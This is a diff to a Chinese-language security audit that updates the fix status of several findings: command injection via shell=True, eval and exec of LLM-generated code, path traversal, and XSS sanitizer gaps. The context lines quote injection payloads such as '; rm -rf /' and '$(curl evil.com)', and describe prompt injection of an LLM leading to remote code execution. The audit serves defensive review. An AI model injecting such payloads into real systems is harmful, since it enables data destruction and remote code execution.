@@ -4178,6 +4178,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **问题**：若任务卡片被污染（如`; rm -rf /`或`$(curl evil.com)`），可执行任意命令
 - **影响**：任意命令执行；违反项目自身process_sandbox.py禁止shell=True的规范
 - **修复**：改用shell=False + shlex.split；或对cmd做白名单校验
+- **状态**：FIXED — 已在 5.17.7 修复中改为 `shlex.split(cmd)` + `shell=False`（task_repo.py L1857-1864），原 L1811 的 subprocess.run 已迁移
 
 #### 5.45.2 [MEDIUM] eval()用于类型注解解析
 - **文件**：[enforcer.py](file:///D:/ZephyrAlpha/src/zephyr/shared/contracts/core/enforcer.py#L374)
@@ -4185,6 +4186,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **问题**：若模块命名空间被污染，eval可执行任意代码
 - **影响**：恶意dataclass定义可借eval执行任意代码
 - **修复**：使用typing.get_type_hints()替代eval fallback
+- **状态**：STILL_VALID（保留）— enforcer.py L374 仍用 `eval(ftype, globalns)` 解析字符串类型注解；需改用 typing.get_type_hints()，但涉及 contracts/core 共享模块需谨慎重构
 
 #### 5.45.3 [HIGH] exec()执行LLM生成的动态代码
 - **文件**：[self_benchmark.py](file:///D:/ZephyrAlpha/src/zephyr/governance/intelligence_governance/self_benchmark.py#L350)
@@ -4192,6 +4194,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **问题**：LLM被提示注入时可生成恶意代码（如`__import__('os').system(...)`）
 - **影响**：任意代码执行；prompt injection直接导致RCE
 - **修复**：沙箱环境执行；或ast.parse白名单校验；至少限制`__builtins__`
+- **状态**：STILL_VALID（保留）— self_benchmark.py L353 仍用 `exec(source, ns)` 执行 LLM 生成代码，无沙箱隔离；需引入 ast 白名单校验或沙箱环境
 
 #### 5.45.4 [MEDIUM] 路径穿越防护用子串匹配而非realpath边界检查
 - **文件**：[gate_engine_server.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/gate_engine_server.py#L235)
@@ -4199,6 +4202,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **问题**：路径规范化绕过（`scripts/./archive`）、符号链接绕过
 - **影响**：可绕过路径黑名单写入禁止目录
 - **修复**：改用realpath + commonpath做边界检查
+- **状态**：STILL_VALID（保留）— gate_engine_server.py L235-237 仍用 `if fragment in target_path` 子串匹配，未用 realpath 规范化；需改用 os.path.realpath + commonpath 边界检查
 
 #### 5.45.5 [LOW] API响应清洗器覆盖面严重不足
 - **文件**：[api_response_sanitizer.py](file:///D:/ZephyrAlpha/src/zephyr/governance/security_governance/api_response_sanitizer.py#L27)
@@ -4206,6 +4210,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **问题**：XSS注入可绕过清洗器
 - **影响**：注入内容进入下游消费方
 - **修复**：使用bleach/lxml.html.clean替代手写字符串替换
+- **状态**：FIXED — 已扩展为 12 个 XSS 模式 + re.IGNORECASE 大小写不敏感匹配（api_response_sanitizer.py L29-50），新增 `<iframe>/<object>/<embed>/data:text/html/vbscript:/onload/onmouseover` 等模式
 
 #### 5.45.6 严重度汇总
 
